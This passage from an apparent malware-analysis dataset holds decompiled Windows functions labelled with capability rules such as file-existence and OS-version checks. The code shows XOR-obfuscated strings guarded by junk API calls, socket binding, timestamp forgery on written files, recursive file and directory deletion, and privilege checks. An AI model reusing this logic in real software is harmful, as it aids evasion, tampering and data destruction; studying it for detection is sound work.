= puVar9 + 1;\n            } while (puVar9 < 0x14);\n            arg_8h = pszFirst;\n            iVar8 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(pszFirst, iVar8);\n            if (iVar8 != 0) break;\n            (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0, puVar5);\n            fcn.004084ec(arg_8h);\n        }\n        if (1 < var_8h) {\n            *0x41cd3c = *(var_4h + 4);\n        }\n        *0x41cd78 = fcn.0040eb49();\n        fcn.00409457();\n        fcn.0040ea67();\n        var_70h = 0x45704d48;\n        var_6ch = 0x311d6d03;\n        var_68h = 0x4d2c5301;\n        var_64h = 0x6d124565;\n        var_60h = 0x53193168;\n        var_5ch = 0x45584d20;\n        var_58h = 0x313f6d30;\n        var_54h = 0x4d1e532a;\n        var_50h = 0x6d35455e;\n        var_4ch = 0x53193139;\n        var_48h = 0x455f4d24;\n        var_44h = 0x31286d27;\n        var_40h = 0x4d035337;\n        var_3ch = 0x6d274554;\n        var_38h = 0x5300316d;\n        var_34h = 0x45414d15;\n        var_30h = 0x31226d3f;\n        var_2ch = 0x4d085337;\n        var_28h = 0x6d0f4543;\n        var_24h._0_2_ = 0x314d;\n        pszSrch = 0x45314d6d;\n        var_10h._0_1_ = 0x53;\n        fcn.00401000(0x9c);\n        puVar9 = pszFirst;\n        iVar10 = 0;\n        var_4h = 0x5;\n        iVar8 = &var_70h - pszFirst;\n        do {\n            iVar6 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n            if (iVar6 != 0x11cc43) {\n                puVar9[iVar10] = *(&pszSrch + iVar10 % var_4h) ^ (puVar9 + iVar10)[iVar8];\n            }\n            iVar10 = iVar10 + 1;\n        } while (iVar10 < 0x4e);\n        var_4ch = 0x6b17645d;\n        var_48h = 0x4417781f;\n        var_44h = 0x641d661f;\n        var_40h = 0x78346b29;\n        var_3ch = 0x6604440b;\n        var_38h = 0x6b61640c;\n        var_34h = 0x4430783a;\n        var_30h = 0x640b660a;\n        var_2ch = 0x78156b2f;\n        var_28h = 0x666b4438;\n        var_20h = 0x6b446478;\n        var_1ch._0_2_ = CONCAT11(var_1ch._1_1_, 0x66);\n        fcn.00401000(0x50);\n        iVar8 = pszSrch;\n        iVar6 = 0;\n        iVar10 = &var_4ch - pszSrch;\n        do {\n            iVar7 = (*_sym.imp.USER32.dll_GetCapture)();\n            if (iVar7 != 0x68d6b) {\n                *(iVar6 + iVar8) = *(&var_20h + iVar6 % var_4h) ^ (iVar6 + iVar8)[iVar10];\n            }\n            pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 0x28);\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0x208);\n        puVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n        pszSrch = puVar5;\n        uVar4 = (*pcVar1)(0, 0x208);\n        var_4h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n        puVar9 = pszFirst;\n        for (iVar10 = 0x208; pcVar1 = _sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW,  iVar10 != 0;\n            iVar10 = iVar10 + -1) {\n            *puVar5 = 0;\n            puVar5 = puVar5 + 1;\n        }\n        puVar5 = var_4h;\n        for (iVar10 = 0x208; iVar10 != 0; iVar10 = iVar10 + -1) {\n            *puVar5 = 0;\n            puVar5 = puVar5 + 1;\n        }\n        (*pcVar1)(pszFirst, pszSrch, 0x104);\n        (*pcVar1)(iVar8, var_4h, 0x104);\n        puVar5 = pszSrch;\n        iVar10 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(*0x41cd3c, pszSrch);\n        if ((iVar10 != 0) || (iVar10 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(*0x41cd3c, var_4h),  iVar10 != 0)) break;\n        fcn.0040625d();\n        fcn.0040ad62();\n    }\n    uVar4 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00404fbc, 0, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar4);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar5);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_4h);\n    (*pcVar1)(uVar4);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n    (*pcVar1)(uVar4);\n    uVar4 = (*pcVar2)(0, puVar9);\n    (*pcVar1)(uVar4);\n    uVar4 = (*pcVar2)(0, var_18h);\n    (*pcVar1)(uVar4);\n    return;\n}\n",
        "token_count": 2512
    },
    "00404e75": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00404e75(void)\n\n{\n    uint32_t uVar1;\n    ushort uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint uStack484;\n    uint uStack480;\n    uint uStack476;\n    uint32_t uStack460;\n    uint32_t uStack456;\n    uint32_t uStack452;\n    uint uStack448;\n    uchar auStack408 [404];\n    \n    uStack476 = &stack0xfffffe68;\n    uStack480 = 0x202;\n    uStack484 = 0x404e96;\n    (*_sym.imp.WS2_32.dll_WSAStartup)();\n    uStack484 = 0;\n    uVar3 = (*_sym.imp.WS2_32.dll_socket)(2, 1);\n    uStack456 = 0;\n    if (uVar3 != 0xffffffff) {\n        uStack452 = uVar3;\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        uStack456 = iVar4 + 2000U & 0xffff;\n        uVar3 = 0;\n        if (uStack456 < 64000) {\n            uStack480 = 0x5a533937;\n            uStack476 = CONCAT31(uStack476._1_3_, 0x6e);\n            do {\n                fcn.00401000(10);\n                uVar3 = uStack452;\n                iVar7 = 0;\n                iVar4 = -uStack452;\n                do {\n                    iVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    uVar1 = uStack456;\n                    if (iVar5 != 0x2b730b) {\n                        *(iVar7 + uVar3) = (&stack0xfffffe1c)[iVar7 % 5] ^ (iVar7 + uVar3)[&stack0xfffffe24 + iVar4];\n                    }\n                    iVar7 = iVar7 + 1;\n                } while (iVar7 < 10);\n                uStack448 = (*_sym.imp.WS2_32.dll_inet_addr)(uVar3);\n                uVar2 = (*_sym.imp.WS2_32.dll_ntohs)(uStack460);\n                uStack456 = CONCAT22(uVar2, 2);\n                iVar4 = (*_sym.imp.WS2_32.dll_bind)(uVar1, &stack0xfffffe38, 0x10);\n                if (iVar4 == 0) {\n                    (*_sym.imp.WS2_32.dll_closesocket)(uVar1);\n                    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, uVar3);\n                    uVar3 = (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n                    uStack456 = uStack460;\n                    break;\n                }\n                uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, uVar3);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n                uStack456 = uStack460 + 1;\n                uVar3 = 0;\n            } while (uStack456 < 64000);\n        }\n    }\n    return uVar3 & 0xffff0000 | uStack456 & 0xffff;\n}\n",
        "token_count": 747
    },
    "004064b2": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004064b2(int32_t *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t in_ECX;\n    int32_t *in_EDX;\n    int32_t iVar7;\n    uint var_ch;\n    uint var_8h;\n    int32_t lpNumberOfBytesRead;\n    \n    iVar7 = 0;\n    iVar2 = fcn.0040643f();\n    if (iVar2 != 0) {\n        in_ECX = iVar2;\n    }\n    iVar3 = (*_sym.imp.KERNEL32.dll_CreateFileW)(in_ECX, 0x80000000, 1, 0, 3, 0x80, 0);\n    if (iVar3 != -1) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetFileSize)(iVar3, 0);\n        if (iVar4 == 0) {\n            iVar4 = 0xe8;\n            goto code_r0x00406554;\n        }\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4 + 2);\n        iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n        if (iVar7 != 0) {\n            iVar5 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar3, iVar7, iVar4, &lpNumberOfBytesRead, 0);\n            if (iVar5 != 0) {\n                if (iVar4 == lpNumberOfBytesRead) {\n                    *(iVar4 + iVar7) = 0;\n                    *in_EDX = iVar7;\n                    *arg_8h = iVar4;\n                    iVar4 = 0;\n                }\n                else {\n                    iVar4 = 0x1e;\n                }\n                goto code_r0x00406554;\n            }\n        }\n    }\n    iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\ncode_r0x00406554:\n    if (iVar3 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    if ((iVar7 != 0) && (iVar4 != 0)) {\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n        (*pcVar1)(uVar6);\n    }\n    if (iVar2 != 0) {\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n        (*pcVar1)(uVar6);\n    }\n    return iVar4;\n}\n",
        "token_count": 604
    },
    "00406596": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00406596(uint lpLastWriteTime)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint32_t uVar7;\n    uint in_EDX;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint lpSystemTime;\n    uint var_22h;\n    int16_t var_1eh;\n    int16_t var_1ch;\n    int16_t var_1ah;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint lpLastAccessTime;\n    uint lpCreationTime;\n    \n    iVar3 = *0x41ccc0;\n    lpLastAccessTime = in_EDX;\n    (*_sym.imp.KERNEL32.dll_GetSystemTime)(&lpSystemTime);\n    pcVar2 = _sym.imp.KERNEL32.dll_SystemTimeToFileTime;\n    uVar8 = iVar3 * 0x19660d + 0x3c6ef35f;\n    lpSystemTime._2_2_ = uVar8 % 0xb + 1;\n    uVar8 = uVar8 * 0x19660d + 0x3c6ef35f;\n    uVar7 = uVar8 * 0x19660d + 0x3c6ef35f;\n    var_22h._0_2_ = uVar8 % 0x1b + 1;\n    var_22h._2_2_ = uVar7 % 0x16 + 1;\n    uVar8 = uVar7 * 0x19660d + 0x3c6ef35f;\n    uVar7 = uVar8 * 0x19660d + 0x3c6ef35f;\n    var_1eh = uVar8 % 0x3b + 1;\n    var_1ch = uVar7 % 0x3b + 1;\n    lpSystemTime._0_2_ = lpSystemTime + -1;\n    var_1ah = ((uVar7 * 0x19660d + 0x3c6ef35f) * 0x19660d + 0x3c6ef35f) % 0x3e6 + 1;\n    (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime);\n    (*pcVar2)(&lpSystemTime);\n    (*pcVar2)(&lpSystemTime, lpLastWriteTime);\n    var_5ch = 0x77113766;\n    var_58h = 0x66594304;\n    var_54h = 0x372a6d13;\n    var_50h = 0x43487714;\n    var_4ch = 0x6d04666b;\n    var_48h = 0x7715373a;\n    var_44h = 0x66524319;\n    var_40h = 0x37706d1a;\n    var_3ch = 0x43317754;\n    var_38h = 0x6d1a6654;\n    var_34h = 0x77483727;\n    var_30h = 0x664f4308;\n    var_2ch = 0x37436d12;\n    var_18h = 0x77663743;\n    var_14h._0_1_ = 0x6d;\n    fcn.00401000(0x68);\n    iVar3 = var_10h;\n    iVar9 = 0;\n    iVar5 = &var_5ch - var_10h;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n        if (iVar4 != 0xa9ea9f) {\n            var_10h = 5;\n            puVar1 = iVar9 + iVar3;\n            *puVar1 = *(&var_18h + iVar9 % 5) ^ puVar1[iVar5];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0x34);\n    iVar5 = fcn.0040643f();\n    if (iVar5 != 0) {\n        iVar9 = (*_sym.imp.KERNEL32.dll_CreateFileW)(iVar5, 0x80000000, 1, 0, 3, 0, 0);\n        if ((iVar9 != 0) && (iVar9 != -1)) {\n            iVar4 = (*_sym.imp.KERNEL32.dll_GetFileTime)(iVar5, lpCreationTime, lpLastAccessTime, lpLastWriteTime);\n            if (iVar4 == 0) {\n                (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpCreationTime);\n                (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpLastAccessTime);\n                (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpLastWriteTime);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar9);\n        }\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    }\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    return 0;\n}\n",
        "token_count": 1336
    },
    "004067bf": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004067bf(uint nNumberOfBytesToWrite)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint lpLastWriteTime;\n    uint lpNumberOfBytesWritten;\n    uint lpBuffer;\n    \n    lpBuffer = in_EDX;\n    iVar1 = fcn.0040643f();\n    if (iVar1 != 0) {\n        in_ECX = iVar1;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileW)(in_ECX, 0xc0000000, 0, 0, 4, 0x80, 0);\n    if (iVar2 == -1) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    else {\n        fcn.00406596(&lpLastWriteTime);\n        iVar4 = (*_sym.imp.KERNEL32.dll_WriteFile)(iVar2, lpBuffer, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, 0);\n        if (iVar4 == 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_SetEndOfFile)(iVar2);\n            uVar3 = 0;\n        }\n        (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar2, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    if (iVar1 != 0) {\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar1);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    }\n    return uVar3;\n}\n",
        "token_count": 427
    },
    "00406873": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00406873(int32_t arg_8h)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t in_ECX;\n    int32_t iVar6;\n    code *pcVar7;\n    code *pcVar8;\n    int32_t iVar9;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    int32_t hFindFile;\n    uint32_t var_24h;\n    int32_t var_20h;\n    uint32_t var_1ch;\n    int16_t *var_18h;\n    int32_t var_14h;\n    int32_t lpString2;\n    int32_t var_ch;\n    uint8_t *lpFindFileData;\n    int32_t lpFileName;\n    \n    iVar9 = 8;\n    var_24h = 0x104;\n    var_2ch = fcn.0040643f();\n    lpString2 = in_ECX;\n    if (var_2ch != 0) {\n        lpString2 = var_2ch;\n    }\n    var_20h = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString2);\n    pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0x208);\n    lpFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n    if (lpFileName != 0) {\n        uVar3 = (*pcVar7)(0, var_20h * 2 + 0xc);\n        var_14h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        if (var_14h != 0) {\n            uVar3 = (*pcVar7)(0, 0x250);\n            lpFindFileData = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            if (lpFindFileData != NULL) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(lpFileName, lpString2);\n                var_ch = 0x724e6a64;\n                var_34h = 0x724e6a38;\n                var_30h._0_2_ = 0x3631;\n                fcn.00401000(8);\n                uVar2 = var_1ch;\n                iVar6 = 0;\n                var_18h = 0x6;\n                iVar9 = &var_ch - var_1ch;\n                do {\n                    iVar4 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n                    if (iVar4 != 0xd11ccc) {\n                        puVar1 = iVar6 + uVar2;\n                        *puVar1 = *(&var_34h + iVar6 % var_18h) ^ puVar1[iVar9];\n                    }\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < 4);\n                (*_sym.imp.KERNEL32.dll_lstrcatW)(lpFileName, uVar2);\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(var_14h, lpString2);\n                var_40h = 0x6a7d6a32;\n                var_3ch = 0x6a447361;\n                var_38h._0_2_ = 0x6a57;\n                var_34h = 0x6a576a6e;\n                var_30h._0_2_ = 0x734f;\n                fcn.00401000(0x14);\n                iVar9 = hFindFile;\n                pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                iVar6 = 0;\n                hFindFile = &var_40h - hFindFile;\n                do {\n                    iVar5 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n                    iVar4 = var_14h;\n                    if (iVar5 != 0x141af8) {\n                        *(iVar6 + iVar9) = *(&var_34h + iVar6 % var_18h) ^ (iVar6 + iVar9)[hFindFile];\n                    }\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < 10);\n                (*_sym.imp.KERNEL32.dll_lstrcatW)(var_14h, iVar9);\n                hFindFile = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(iVar4, lpFindFileData);\n                uVar2 = var_1ch;\n                if (hFindFile == -1) {\n                    var_ch = 3;\n                }\n                else {\n                    var_ch = 0;\n                    var_18h = lpFindFileData + 0x2c;\n                    do {\n                        if (*var_18h != 0x2e) {\n                            iVar6 = (*_sym.imp.KERNEL32.dll_lstrlenW)(var_18h);\n                            var_1ch = iVar6 + 2 + var_20h;\n                            if (var_24h < var_1ch) {\n                                uVar3 = (*pcVar7)(0, lpFileName);\n                                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                                uVar3 = (*pcVar7)(0, var_1ch * 2);\n                                lpFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                                if (lpFileName == 0) {\n                                    var_ch = 8;\n                                    break;\n                                }\n                                var_24h = var_1ch;\n                                (*_sym.imp.KERNEL32.dll_lstrcpyW)(lpFileName, lpString2);\n                                (*_sym.imp.KERNEL32.dll_lstrcatW)(lpFileName, uVar2);\n                            }\n                            else {\n                                *(lpFileName + 2 + var_20h * 2) = 0;\n                            }\n                            (*_sym.imp.KERNEL32.dll_lstrcatW)(lpFileName, var_18h);\n                            if ((*lpFindFileData & 0x10) == 0) {\n                                iVar6 = (*_sym.imp.KERNEL32.dll_DeleteFileW)(lpFileName);\n                            }\n                            else {\n                                var_ch = fcn.00406873(arg_8h);\n                                if (var_ch != 0) break;\n                                iVar6 = (*_sym.imp.KERNEL32.dll_RemoveDirectoryW)(lpFileName);\n                            }\n                            if ((iVar6 == 0) && (arg_8h == 0)) {\n                                var_ch = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                                break;\n                            }\n                        }\n                        iVar6 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(hFindFile, lpFindFileData);\n                    } while (iVar6 != 0);\n                }\n                uVar3 = (*pcVar7)(0, iVar9);\n                pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                uVar3 = (*pcVar7)(0, uVar2);\n                (*pcVar8)(uVar3);\n                uVar3 = (*pcVar7)(0, lpFindFileData);\n                (*pcVar8)(uVar3);\n                iVar9 = var_ch;\n            }\n            uVar3 = (*pcVar7)(0, var_14h);\n            (*pcVar8)(uVar3);\n        }\n        if (lpFileName != 0) {\n            uVar3 = (*pcVar7)(0, lpFileName);\n            (*pcVar8)(uVar3);\n        }\n    }\n    if (var_2ch != 0) {\n        uVar3 = (*pcVar7)(0, var_2ch);\n        (*pcVar8)(uVar3);\n    }\n    return iVar9;\n}\n",
        "token_count": 1774
    },
    "00406e7a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00406e7a(int32_t param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    var_4h = 0;\n    if (param_1 != 0) {\n        if (param_2 == -1) {\n            param_2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1);\n        }\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_2 + 1);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if ((iVar2 != 0) &&\n           (iVar3 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, param_2, iVar2, param_2 + 1, 0, 0), \n           iVar3 != 0)) {\n            var_4h = fcn.00406dcf();\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 288
    },
    "00409d97": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00409d97(int32_t param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint extraout_ECX;\n    int32_t iVar4;\n    int32_t lpBuffer;\n    int32_t lpNumberOfBytesRead;\n    uint lpFileName;\n    int32_t lDistanceToMove;\n    int32_t var_4h;\n    \n    iVar4 = 0;\n    var_4h = 0;\n    iVar2 = fcn.0040ac08();\n    if (iVar2 == 0) {\n        iVar2 = fcn.00409305(extraout_ECX);\n        if ((iVar2 != 0) && (lDistanceToMove = fcn.0040938b(),  lDistanceToMove != 0)) {\n            cVar1 = '\\0';\n            if (((*0x41cd38 & 1) != 0) && (*(*(param_1 + 0x3c) + 4 + param_1) == 0x14c)) {\n                cVar1 = fcn.00409c33();\n                cVar1 = '\\x01' - (cVar1 != '\\0');\n            }\n            iVar4 = (*_sym.imp.KERNEL32.dll_CreateFileW)(lpFileName, 0x80000000, 1, 0, 3, 0x80, 0);\n            if (iVar4 != -1) {\n                iVar2 = (*_sym.imp.KERNEL32.dll_SetFilePointer)(iVar4, lDistanceToMove, 0, 0);\n                if (((iVar2 == lDistanceToMove) &&\n                    (iVar2 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar4, &lpBuffer, 4, &lpNumberOfBytesRead, 0), \n                    iVar2 != 0)) && (lpNumberOfBytesRead == 4)) {\n                    var_4h = lpBuffer + param_1;\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n            }\n            iVar4 = var_4h;\n            if (cVar1 != '\\0') {\n                fcn.00409c33();\n                iVar4 = var_4h;\n            }\n        }\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpFileName);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return iVar4;\n}\n",
        "token_count": 538
    },
    "0040d32d": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040d32d(uint param_1)\n\n{\n    int32_t iVar1;\n    \n    *0x41cdf4 = 1;\n    fcn.00404e4e(param_1);\n    fcn.0040cb4f();\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(*0x41cd3c);\n    if (iVar1 != -1) {\n        fcn.00406b54();\n    }\n    fcn.0040cece();\n    (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n    fcn.0040cde9();\n    return;\n}\n",
        "token_count": 143
    },
    "00406f62": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00406f62(uint param_1)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint pSid;\n    uint pIdentifierAuthority;\n    uchar var_10h;\n    uchar var_fh;\n    int32_t cbSid;\n    uint nSize;\n    uint32_t var_4h;\n    \n    *0x41cd78 = param_1;\n    *0x41cd7c = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    *0x41cd44 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n    *0x41cd34 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n    fcn.004099a8();\n    fcn.00406ef1();\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0x20);\n    *0x41cd5c = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    cbSid = 5;\n    if (*0x41cd5c != 0) {\n        nSize = 0x10;\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetComputerNameW)(*0x41cd5c, &nSize);\n        if (iVar3 == 0) {\n            var_28h = 0x6314371a;\n            var_24h = 0x5a794f78;\n            var_20h = 0x3718332c;\n            var_1ch._0_2_ = 0x635a;\n            pIdentifierAuthority = 0x635a374f;\n            var_10h = 0x33;\n            fcn.00401000(0x1c);\n            iVar3 = 0;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_GetMessageTime)();\n                if (iVar4 != 0xcbb1d6) {\n                    *(iVar3 + var_4h) = *(&pIdentifierAuthority + iVar3 % cbSid) ^ (iVar3 + var_4h)[&var_28h - var_4h];\n                }\n                iVar3 = iVar3 + 1;\n            } while (iVar3 < 0xe);\n            (*_sym.imp.KERNEL32.dll_lstrcpyW)(*0x41cd5c, var_4h);\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_4h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        }\n        fcn.00406b95();\n    }\n    var_fh = 5;\n    pIdentifierAuthority = 0;\n    var_10h = 0;\n    var_4h = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                       (&pIdentifierAuthority, 2, 0x20, 0x220, 0, 0, 0, 0, 0, 0, &nSize);\n    pcVar1 = _sym.imp.ADVAPI32.dll_CheckTokenMembership;\n    if (var_4h != 0) {\n        iVar3 = (*_sym.imp.ADVAPI32.dll_CheckTokenMembership)(0, nSize, &var_4h);\n        var_4h = var_4h & -(iVar3 != 0);\n        (*_sym.imp.ADVAPI32.dll_FreeSid)(nSize);\n        if (var_4h != 0) {\n            if (5 < *0x41cd44) {\n                iVar3 = fcn.0040721d();\n                if (iVar3 == 0) {\n                    *0x41cd64 = 3;\n                    goto code_r0x00407128;\n                }\n            }\n            *0x41cd64 = 4;\n            goto code_r0x00407128;\n        }\n    }\n    var_4h = 0;\n    cbSid = 0xc;\n    var_4h = (*_sym.imp.ADVAPI32.dll_CreateWellKnownSid)(0x27, 0, &pSid, &cbSid);\n    if (var_4h != 0) {\n        (*pcVar1)(0, &pSid, &var_4h);\n        *0x41cd64 = 1;\n        if (var_4h != 0) goto code_r0x00407128;\n    }\n    *0x41cd64 = 2;\ncode_r0x00407128:\n    if (*0x41cd44 < 6) {\n        *0x41cd60 = 2;\n    }\n    else {\n        *0x41cd60 = fcn.0040714f();\n    }\n    return 0;\n}\n",
        "token_count": 1082
    },
    "0040b055": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
